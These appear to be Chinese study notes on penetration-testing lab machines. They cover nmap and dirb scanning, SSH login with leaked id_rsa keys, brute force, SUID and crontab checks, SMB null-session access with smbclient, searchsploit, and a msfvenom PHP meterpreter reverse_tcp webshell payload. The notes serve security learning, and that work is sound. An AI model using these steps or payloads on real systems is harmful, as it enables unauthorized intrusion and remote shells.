分析探测结果

每一个服务对应计算机的一个端口，用来进行通信。常用端口0~1023，在扫描结果中查找特殊端口

针对特殊端口进行探测，尤其对开发大端口的http服务进行排查



探测大端口的服务

```bash
nmap -sV [ip]
dirb http://[ip]:[port]
ssh -i id_rsa username@ip

find / -perm -4000 2>/dev/null
```

## ssh服务渗透

### 1.信息探测

对于给定ip地址的靶场机器，对其进行渗透测试，首先需要考虑 靶场机器 开放的服务

探测靶场开放的服务与服务版本

```bash
nmap -sV ip
```

探测靶场全部信息

```bash
nmap -A -v ip
```

探测靶场的操作系统类型与版本

nmap -O ip

### 2.分析探测结果

对于SSH服务的22端口的靶场

首先考虑

1. 暴破
2. 私钥泄露（私钥有没有对应的密码、是否能够找到该私钥的用户名）

对于开放http服务的80端口或其他端口的靶场

首先考虑

1. 通过浏览器访问对应的靶场http服务，如http://ip:port
2. 使用dirb探测工具对http的目录进行探测，如dirb http://ip:port/



### 3.挖掘敏感信息

使用浏览器对靶场IP的http服务探测，对页面中展示的内容也要注意，尤其是联系人等信息（很可能就是ssh的用户名信息），递归访问，力争把每一个dirb扫描到的目录页面都访问查看

尤其对robots.txt以及一些目录进行访问，挖掘具备利用价值的信息。对于开方ssh服务的靶场，务必要注意到是否可以寻找到ssh私钥信息（id_rsa）

或利用nikto进行挖掘：

nikto -host [ip]

### 4.利用敏感、弱点信息

对于挖掘到ssh密钥利用

1. 修改id_rsa密钥利用

```bash
chmod 600 id_rsa
```

2. 利用私钥登录服务器

```
ssh -i id_rsa username@ip
```

注意如果id_rsa没有解密密码，可以直接使用，但是如果id_rsa有解密密码，那么就需要进行相应的破解



### 5.扩大战果

登录服务器后，我们应该这样做

1. whoami
2. id 查看当前用户权限
3. 查看根目录寻找flag文件

如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组



### 6.深入挖掘

通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以由不同的定时任务





针对SMB协议弱点分析

1. 针对SMB协议，使用空口令，尝试登陆，并查看敏感信息，get下载查看

```bash
smbclient -L [ip]
smbclient '\\[ip]\share$'
get 敏感文件
```

2. 针对SMB协议远程溢出漏洞进行分析

```bash
searchploit sanba版本号
```



针对http协议弱点分析

1. 浏览器4查看网站
2. 使用dirb nikto探测
3. 寻找突破点，目标登录后台，上传webshell



制作webshell

msfvenom -p php/meterpreter/reverse_tcp lhost= lport= -f raw



webshell

msfconsole